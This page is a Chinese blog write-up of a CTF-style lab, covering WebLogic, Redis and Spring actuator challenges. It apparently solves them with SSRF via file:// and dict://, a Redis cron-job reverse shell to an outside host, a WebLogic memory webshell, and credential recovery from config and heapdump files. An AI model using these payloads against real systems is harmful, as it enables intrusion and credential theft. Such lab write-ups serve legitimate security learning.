@@ -1,0 +1,935 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/mimi.jpg">
+  <link rel="icon" href="/img/mimi.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Goocean5263">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="笔试题">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某靶场实战">
+<meta property="og:url" content="https://goocean5263.github.io/2025/11/05/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/index.html">
+<meta property="og:site_name" content="Gone with the Wind">
+<meta property="og:description" content="笔试题">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919192714673.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919192844112.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919193027219.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919193239829.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919195428169.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919200252437.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919200847479.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919201127176.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921185210449.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225049954.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225258048.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225348324.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919233820620.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919233918258.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919234441186.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919234453884.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250920223236208.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250920224248790.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921202837408.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203012484.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203232527.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921152758444.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921153626026.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921153705058.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921163539323.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921175142146.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921180326806.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203838794.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203857569.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921204248049.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210053972.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210147940.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210253548.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210526618.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210621543.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210831372.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210846021.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921210951049.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211211294.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211301994.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921211334956.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921212424628.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921213120926.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921213157591.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921215703377.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921221015360.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921223445583.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921235141053.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225108196.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921233217826.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225609832.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921225656319.png">
+<meta property="og:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921234002678.png">
+<meta property="article:published_time" content="2025-11-05T07:22:14.000Z">
+<meta property="article:modified_time" content="2026-03-09T08:02:33.912Z">
+<meta property="article:author" content="Goocean5263">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="wp">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://goocean5263.github.io/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919192714673.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>某靶场实战 - Gone with the Wind</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"goocean5263.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":"b264de23432894f08f407e28d8a46a83","google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+    <!-- Baidu Analytics -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        var _hmt = _hmt || [];
+        (function() {
+          var hm = document.createElement("script");
+          hm.src = "https://hm.baidu.com/hm.js?b264de23432894f08f407e28d8a46a83";
+          var s = document.getElementsByTagName("script")[0];
+          s.parentNode.insertBefore(hm, s);
+        })();
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Gong with the wind</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="某靶场实战"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-11-05 15:22" pubdate>
+          2025年11月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">某靶场实战</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h1><h2 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919192714673.png" srcset="/img/loading.gif" lazyload alt="image-20250919192714673"></p>
+<p>由题可知，在主机根目录</p>
+<p>尝试file:&#x2F;&#x2F;协议进行任意文件读取，有内容，所以尝试读取flag文件</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919192844112.png" srcset="/img/loading.gif" lazyload alt="image-20250919192844112"></p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>flag</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919193027219.png" srcset="/img/loading.gif" lazyload alt="image-20250919193027219"></p>
+<p>得到flag1</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meetsec</span>-web1&#123;flag1-<span class="hljs-number">6</span>d5e5c2bb397ba7727b58df59b35f66a&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919193239829.png" srcset="/img/loading.gif" lazyload alt="image-20250919193239829"></p>
+<p>题目说flag在第二台主机中，并且内网范围在172.18.240.0&#x2F;24</p>
+<p>所以可以使用dict:&#x2F;&#x2F;协议进行IP和端口号的探测，探测几个常用端口试试</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919195428169.png" srcset="/img/loading.gif" lazyload alt="image-20250919195428169"></p>
+<p>最后发现只有172.18.240.7:6379、172.18.240.1.6379存活；6379是redis的默认端口</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919200252437.png" srcset="/img/loading.gif" lazyload alt="image-20250919200252437"></p>
+<p>使用<code>keys</code>查看键值</p>
+<p>1查不出东西，去7试试，发现flag</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.18.240.7:6379/keys *</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919200847479.png" srcset="/img/loading.gif" lazyload alt="image-20250919200847479"></p>
+<p>直接get即可得到flag</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">dict:</span><span class="hljs-comment">//172.18.240.7:6379/get flag</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919201127176.png" srcset="/img/loading.gif" lazyload alt="image-20250919201127176"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">meetsec-web<span class="hljs-number">1</span>&#123;flag<span class="hljs-number">2</span><span class="hljs-number">-2</span>b<span class="hljs-number">7</span><span class="hljs-keyword">cc</span><span class="hljs-number">5</span>b<span class="hljs-number">73</span>fe<span class="hljs-number">867</span><span class="hljs-keyword">cc</span><span class="hljs-number">83546583</span>b<span class="hljs-number">858</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>ab&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="FLAG3"><a href="#FLAG3" class="headerlink" title="FLAG3"></a>FLAG3</h2><p>题目提示flag在第二台主机的根目录下</p>
+<p>对于redis未授权，我们可以尝试反弹shell</p>
+<p>经过测试，发现可以通过写入定时任务反弹shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">dict://172.18.240.7:6379/set <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/t8afc2fc.natappfree.cc/52401 0&gt;&amp;1\n&quot;</span><br>dict://172.18.240.7:6379/config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron/<br>dict://172.18.240.7:6379/config <span class="hljs-built_in">set</span> dbfilename root<br>dict://172.18.240.7:6379/save<br>nc -lvp 1234<br></code></pre></td></tr></table></figure>
+
+<p>反弹成功，得到flag</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921185210449.png" srcset="/img/loading.gif" lazyload alt="image-20250921185210449"></p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">meetsec-web1</span><span class="hljs-template-variable">&#123;flag3-f22eec9fb7c498b3a747392ff53a746b&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><h2 id="FLAG1-1"><a href="#FLAG1-1" class="headerlink" title="FLAG1"></a>FLAG1</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225049954.png" srcset="/img/loading.gif" lazyload alt="image-20250919225049954"></p>
+<p>登录网址发现报404，抓包什么都做了也没发现什么</p>
+<p>但是注意到端口号是7001，即WebLogic的端口</p>
+<p>打开WebLogicTool进行检测，发现果然有漏洞</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225258048.png" srcset="/img/loading.gif" lazyload alt="image-20250919225258048"></p>
+<p>题目说flag就在根目录，所以直接读取就行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /flag<br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919225348324.png" srcset="/img/loading.gif" lazyload alt="image-20250919225348324"></p>
+<p>得到flag</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meetsec</span>-web2&#123;flag1-<span class="hljs-number">3</span>e942fd37767def3a9f68cf5ee6ebee5&#125;<br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="FLAG2-1"><a href="#FLAG2-1" class="headerlink" title="FLAG2"></a>FLAG2</h2><p>注入内存马，然后使用哥斯拉进行连接</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919233820620.png" srcset="/img/loading.gif" lazyload alt="image-20250919233820620"></p>
+<p>找到编码后的数据库密码密文</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919233918258.png" srcset="/img/loading.gif" lazyload alt="image-20250919233918258"></p>
+<p>还缺密钥，工具提示</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919234441186.png" srcset="/img/loading.gif" lazyload alt="image-20250919234441186"></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250919234453884.png" srcset="/img/loading.gif" lazyload alt="image-20250919234453884"></p>
+<p>得到密钥</p>
+<p>不过不管怎么解密，工具都解不出来不知道怎么回事</p>
+<p>去网上找到一个大佬写的解密工具</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250920223236208.png" srcset="/img/loading.gif" lazyload alt="image-20250920223236208"></p>
+<p>得到密码：Meetsec#1024</p>
+<p>然后通过扫描扫出来个172.25.20.12:3306</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250920224248790.png" srcset="/img/loading.gif" lazyload alt="image-20250920224248790"></p>
+<p>在数据库管理这里连接上数据库，得到flag2</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921202837408.png" srcset="/img/loading.gif" lazyload alt="image-20250921202837408"></p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">meetsec-web<span class="hljs-number">2</span>&#123;flag<span class="hljs-number">2</span><span class="hljs-number">-9</span>fffac<span class="hljs-number">75</span><span class="hljs-keyword">c</span><span class="hljs-number">84</span>bfc<span class="hljs-number">66</span>fef<span class="hljs-number">4998</span>f<span class="hljs-number">3574</span><span class="hljs-keyword">c</span><span class="hljs-number">6</span><span class="hljs-keyword">c</span><span class="hljs-number">8</span>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<hr>
+<h2 id="FLAG3-1"><a href="#FLAG3-1" class="headerlink" title="FLAG3"></a>FLAG3</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203012484.png" srcset="/img/loading.gif" lazyload alt="image-20250921203012484"></p>
+<p>既然已经进到数据库，那我们直接使用sql的文件读取load_file()</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921203232527.png" srcset="/img/loading.gif" lazyload alt="image-20250921203232527"></p>
+<p>得到flag3</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">meetsec</span>-web2&#123;flag3-<span class="hljs-number">2</span>e947aef43be6dc428a9c626ba7fb824&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><h2 id="FLAG1-2"><a href="#FLAG1-2" class="headerlink" title="FLAG1"></a>FLAG1</h2><p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921152758444.png" srcset="/img/loading.gif" lazyload alt="image-20250921152758444"></p>
+<p>用dirsearch扫一下，扫到如下内容</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921153626026.png" srcset="/img/loading.gif" lazyload alt="image-20250921153626026"></p>
+<p>进入<a target="_blank" rel="noopener" href="http://118.195.152.204:22883/actuator/env">118.195.152.204:22883&#x2F;actuator&#x2F;env</a></p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921153705058.png" srcset="/img/loading.gif" lazyload alt="image-20250921153705058"></p>
+<p>找到flag1：</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">meetsec-web3</span><span class="hljs-template-variable">&#123;flag1-e20cdd96b8985a3557e5720726bb09a8&#125;</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="FLAG2-2"><a href="#FLAG2-2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p>题目说在数据库里，那我们就去找数据库信息</p>
+<p>FLAG1那个图里的数据我们将其JSON格式化一下</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921163539323.png" srcset="/img/loading.gif" lazyload alt="image-20250921163539323"></p>
+<p>得到了数据库用户名：meetsec，但密码被*替换了，所以我们尝试去<strong>heapdump</strong>文件中找一下</p>
+<p>一开始用MAT找了半天没找到，去网上找到个大佬写的工具：JDumpSpider</p>
+<p>得到密码：MeetSec@2nd!2022</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921175142146.png" srcset="/img/loading.gif" lazyload alt="image-20250921175142146"></p>
+<p>使用Navicat连接数据库得到flag2</p>
+<p><img src="/images/%E6%9F%90%E9%9D%B6%E5%9C%BA%E5%AE%9E%E6%88%98/image-20250921180326806.png" srcset="/img/loading.gif" lazyload alt="image-20250921180326806"></p>
